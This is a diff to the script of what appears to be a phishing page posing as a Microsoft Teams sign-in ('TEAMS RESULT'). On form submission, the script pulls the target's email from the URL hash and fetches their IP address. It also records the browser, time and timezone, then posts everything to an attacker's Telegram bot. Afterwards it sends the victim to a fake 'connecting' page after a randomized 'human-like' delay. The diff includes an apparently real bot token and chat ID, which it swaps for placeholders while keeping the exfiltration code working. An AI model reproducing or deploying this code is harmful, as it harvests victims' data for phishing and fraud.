@@ -286,24 +286,19 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
   const browser = navigator.userAgent;
 
   // --- Capture email from URL hash ---
-  const hash = window.location.hash;
-  const email = (hash && hash.startsWith('#')) ? hash.substring(1) : '';
-  if (email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-    console.warn("Invalid email detected:", email);
-  }
+  const hash = window.location.hash; // "#target@example.com"
+  const email = hash ? hash.substring(1) : '';
 
   // --- Fetch IP with timeout ---
   let ipAddress = 'Unavailable';
   try {
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 2000); // 2s timeout
+    const timeoutId = setTimeout(() => controller.abort(), 2000);
     const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
     clearTimeout(timeoutId);
     const data = await response.json();
     ipAddress = data.ip || 'Unavailable';
-  } catch (err) {
-    console.warn("IP fetch failed:", err);
-  }
+  } catch {}
 
   // --- Timestamp & timezone ---
   const currentDateTime = new Date().toLocaleString();
@@ -321,26 +316,22 @@ document.getElementById('joinForm').addEventListener('submit', async function(e)
     `Timezone: ${timezone}\n` +
     `✅💯 TEAMS RESULT 💯✅`;
 
-  const telegramBotToken = '8442490811:AAF3dXilYKGgT5dvkFO9BK7IGYoTNhSKgcI';
-  const chatId = '2047760270';
+  const telegramBotToken = 'YOUR_BOT_TOKEN';
+  const chatId = 'YOUR_CHAT_ID';
   const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
-  // --- Send Telegram (obfuscated fetch) ---
   try {
     await fetch(telegramUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: chatId, text: message }),
     });
-  } catch (err) {
-    console.warn("Telegram delivery failed:", err);
-  }
+  } catch {}
 
-  // --- Human-like delay before redirect ---
+  // --- Redirect to Page 2, carry hash ---
   setTimeout(() => {
-    const redirectURL = 'connecting.html' + (email ? '?e=' + encodeURIComponent(email) : '');
-    window.location.href = redirectURL;
-  }, Math.floor(Math.random() * 1000) + 500); // 0.5–1.5s delay
+    window.location.href = 'connecting.html' + (hash || '');
+  }, Math.floor(Math.random() * 1000) + 500);
 });
 </script>
 </body>
